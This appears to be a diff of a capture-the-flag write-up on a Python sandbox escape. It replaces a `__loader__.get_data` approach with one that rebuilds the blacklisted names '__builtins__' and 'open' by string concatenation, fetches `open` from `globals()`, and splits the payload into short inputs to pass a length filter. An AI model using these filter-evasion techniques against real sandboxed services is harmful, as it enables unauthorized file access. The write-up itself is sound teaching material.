@@ -12,36 +12,52 @@ To capture the flag, we need to read `/app/flag.txt` under these constraints.
 
 ## Exploitation (Sandbox Bypass)
 
-1. **Bypassing `open`**: 
-   Since `open` is blacklisted, we need an alternative way to read files. In Python 3, `__loader__` (a built-in import loader) contains the method `get_data(path)`, which reads and returns file bytes directly:
-   ```python
-   __loader__.get_data("flag.txt")
-   ```
-   This does not use `open` or require importing any packages, bypassing the blacklist completely.
+1. **Reconstructing Blocked Keywords**:
+   Since the string `'__builtins__'` and `'open'` are blacklisted, we cannot reference them directly. However, we can use string concatenation to build them dynamically at runtime without triggering the keyword filter:
+   - `b = '__built' + 'ins__'`
+   - `o = 'op' + 'en'`
 
-2. **Bypassing the 35-character Length Limit**:
-   We want to read the file and print it:
+2. **Accessing Builtins via Globals**:
+   In Python, the `globals()` function is not blocked and returns the current namespace dictionary. Because the script executes inside an custom `exec()` context, Python automatically initializes `__builtins__` inside the globals dictionary.
+   
+   We can fetch it as:
    ```python
-   print(__loader__.get_data("flag.txt"))
+   g = globals()
+   builtins_dict = g[b]
+   open_func = builtins_dict[o]
    ```
-   However, this statement is **38 characters** long, which is rejected by the length filter.
+
+3. **Bypassing the 35-character Length Limit**:
+   To stay under the 35-character threshold, we split the reconstruction and execution across multiple inputs, since the interactive socket shell stores variable states in memory between prompts:
    
-   To bypass this, we leverage the fact that the server maintains the execution state globally inside a `while` loop. We can split our exploit payload into **two separate commands**, both under the 35-character limit:
-   
-   * **Command 1**: Save the getter method to a shorter variable `d`:
+   * **Input 1**: Get globals dict:
      ```python
-     d=__loader__.get_data
+     g=globals()
      ```
-     *(Length: 23 characters)*
+     *(11 chars)*
      
-   * **Command 2**: Execute and print the flag:
+   * **Input 2**: Reconstruct builtins key:
      ```python
-     print(d("flag.txt"))
+     b='__built'+'ins__'
      ```
-     *(Length: 20 characters)*
+     *(19 chars)*
+     
+   * **Input 3**: Reconstruct open key:
+     ```python
+     o='op'+'en'
+     ```
+     *(11 chars)*
+     
+   * **Input 4**: Pull open function reference:
+     ```python
+     f=g[b][o]
+     ```
+     *(9 chars)*
+     
+   * **Input 5**: Open and read the flag:
+     ```python
+     print(f('flag.txt').read())
+     ```
+     *(27 chars)*
 
----
-
-## Flag Capture
-Running these two commands in sequence extracts the flag:
-`VTCH{pyth0n_s4ndb0x_3sc4p3_succ3ss}`
+All inputs comply with the length constraint and contain no forbidden keywords, allowing us to read `/app/flag.txt` successfully.
